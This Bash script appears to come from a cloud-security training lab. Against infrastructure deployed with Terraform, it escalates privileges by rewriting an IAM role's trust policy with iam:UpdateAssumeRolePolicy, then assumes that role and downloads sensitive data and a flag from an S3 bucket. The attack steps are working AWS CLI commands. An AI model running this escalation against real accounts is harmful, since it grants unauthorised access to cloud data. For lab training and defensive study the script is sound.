#!/bin/bash

# Demo script for iam:UpdateAssumeRolePolicy privilege escalation to S3 bucket
# This is a ROLE-BASED one-hop scenario


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-012-to-bucket-starting-user"
STARTING_ROLE="pl-prod-iam-012-to-bucket-starting-role"
TARGET_ROLE="pl-prod-iam-012-to-bucket-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM UpdateAssumeRolePolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}Role-Based One-Hop to S3 Bucket${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_iam_012_iam_updateassumerolepolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and ARNs
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
STARTING_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify identity as user
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
use_starting_creds
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as expected user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"

# [EXPLOIT] Step 3: Assume the starting role
echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
echo "Role ARN: $STARTING_ROLE_ARN"
use_starting_creds

show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$STARTING_ROLE_ARN\" --role-session-name \"iam-012-demo-session\""
ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
    --role-arn "$STARTING_ROLE_ARN" \
    --role-session-name "iam-012-demo-session")

# Update credentials to use assumed role
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"

# [OBSERVATION] Step 4: Check current trust policy of target role
echo -e "${YELLOW}Step 4: Checking current trust policy of target role${NC}"
echo "Target role ARN: $TARGET_ROLE_ARN"
use_readonly_creds

show_cmd "ReadOnly" "aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json"
CURRENT_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json)
echo "Current trust policy:"
echo "$CURRENT_TRUST_POLICY" | jq '.'

# Save original trust policy for cleanup
echo "$CURRENT_TRUST_POLICY" > /tmp/original_trust_policy_iam_012_bucket.json

# Try to assume the target role (should fail) - switch back to starting role session
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "\n${YELLOW}Attempting to assume target role (should fail)...${NC}"
show_cmd "Attacker" "aws sts assume-role --role-arn \"$TARGET_ROLE_ARN\" --role-session-name test-session"
if aws sts assume-role --role-arn "$TARGET_ROLE_ARN" --role-session-name test-session &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly able to assume target role already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot assume target role (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Verify we don't have S3 bucket access yet
echo -e "${YELLOW}Step 5: Verifying we don't have S3 bucket access yet${NC}"
echo "Attempting to list S3 bucket contents (should fail)..."
# Still using starting role session credentials set above
show_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
if aws s3 ls s3://$BUCKET_NAME/ &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket yet${NC}"
fi
echo ""

# [EXPLOIT] Step 6: Update the trust policy to allow our role to assume it
echo -e "${YELLOW}Step 6: Updating trust policy via iam:UpdateAssumeRolePolicy${NC}"
echo "Modifying target role trust policy to allow $STARTING_ROLE to assume it..."

NEW_TRUST_POLICY=$(cat <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "$STARTING_ROLE_ARN"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF
)

echo "New trust policy to be applied:"
echo "$NEW_TRUST_POLICY" | jq '.'

# Update the trust policy (using starting role session credentials still active from step 3)
show_attack_cmd "Attacker" "aws iam update-assume-role-policy --role-name $TARGET_ROLE --policy-document \"$NEW_TRUST_POLICY\""
aws iam update-assume-role-policy \
    --role-name $TARGET_ROLE \
    --policy-document "$NEW_TRUST_POLICY"

echo -e "${GREEN}✓ Successfully updated trust policy!${NC}\n"

# Wait for IAM propagation
echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
sleep 15
echo ""

# [EXPLOIT] Step 7: Assume the target role
echo -e "${YELLOW}Step 7: Assuming the target role${NC}"
# Still using starting role session credentials from step 3
show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$TARGET_ROLE_ARN\" --role-session-name bucket-access-session --output json"
TARGET_CREDENTIALS=$(aws sts assume-role \
    --role-arn "$TARGET_ROLE_ARN" \
    --role-session-name bucket-access-session \
    --output json)

# Extract target role credentials
export AWS_ACCESS_KEY_ID=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.SessionToken')

# Verify target role assumption
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
TARGET_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $TARGET_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed target role!${NC}\n"

# [EXPLOIT] Step 8: Access the S3 bucket
echo -e "${YELLOW}Step 8: Accessing S3 bucket${NC}"
echo "Target bucket: $BUCKET_NAME"
echo "Listing bucket contents..."

show_attack_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
aws s3 ls s3://$BUCKET_NAME/
echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}\n"

# [EXPLOIT] Step 9: Download sensitive data
echo -e "${YELLOW}Step 9: Downloading sensitive data${NC}"
DOWNLOAD_FILE="/tmp/iam-012-sensitive-data.txt"
show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE"
aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE

echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
echo -e "${YELLOW}Contents of sensitive file:${NC}"
cat $DOWNLOAD_FILE
echo ""

# [EXPLOIT] Step 10: Retrieve CTF flag
echo -e "${YELLOW}Step 10: Retrieving CTF flag${NC}"
FLAG_FILE="/tmp/iam-012-to-bucket-flag.txt"
show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/flag.txt -"
aws s3 cp s3://$BUCKET_NAME/flag.txt $FLAG_FILE
FLAG_VALUE=$(cat $FLAG_FILE)

echo -e "\n${GREEN}✓ Successfully retrieved flag${NC}"
echo -e "${YELLOW}Flag:${NC}"
echo "$FLAG_VALUE"
echo ""

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
echo -e "Step 2: Used ${YELLOW}iam:UpdateAssumeRolePolicy${NC} to modify $TARGET_ROLE trust policy"
echo -e "Step 3: Assumed ${YELLOW}$TARGET_ROLE${NC}"
echo -e "Step 4: Accessed ${YELLOW}$BUCKET_NAME${NC}"
echo -e "Step 5: Read ${YELLOW}flag.txt${NC} -- ${GREEN}$FLAG_VALUE${NC}"
echo -e "Result: ${GREEN}S3 Bucket Access + CTF Flag${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (UpdateAssumeRolePolicy) → $TARGET_ROLE → S3 Bucket → flag.txt (CTF flag)"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi
echo ""

echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to restore the original trust policy${NC}"
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
